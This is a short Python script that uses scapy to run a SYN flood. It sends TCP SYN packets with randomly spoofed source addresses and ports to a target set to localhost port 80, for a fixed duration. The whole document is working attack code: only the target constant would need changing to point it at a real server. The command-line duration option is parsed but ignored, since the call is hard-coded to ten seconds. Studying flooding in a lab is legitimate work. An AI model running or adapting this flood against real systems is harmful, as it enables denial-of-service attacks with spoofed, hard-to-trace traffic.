from scapy.all import IP, TCP, send
import random
import time
import argparse

TARGET_IP = "127.0.0.1"
TARGET_PORT = 80   
RATE_SLEEP = 0.01  

def random_ip():
    return ".".join(str(random.randint(1, 254)) for i in range(4))

def run(duration=10):
    print(f"[*] SYN flood simulation (localhost) for {duration}s")
    start = time.time()
    count = 0
    try:
        while time.time() - start < duration:
            src_ip = random_ip()
            src_port = random.randint(1024, 65535)
            pkt = IP(src=src_ip, dst=TARGET_IP)/TCP(sport=src_port, dport=TARGET_PORT, flags="S")
            send(pkt, verbose=0)
            count += 1
            print(count)
            if count % 50 == 0:
                print(f"[+] Sent {count} packets")
            time.sleep(RATE_SLEEP)
    except KeyboardInterrupt:
        pass
    print("\n[*] Finished")
    print("Total packets sent:", count)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Localhost SYN flood (time-limited).")
    parser.add_argument("-t", "--time", type=int, default=10, help="Duration in seconds (default 10)")
    args = parser.parse_args()
    run(duration=10)
  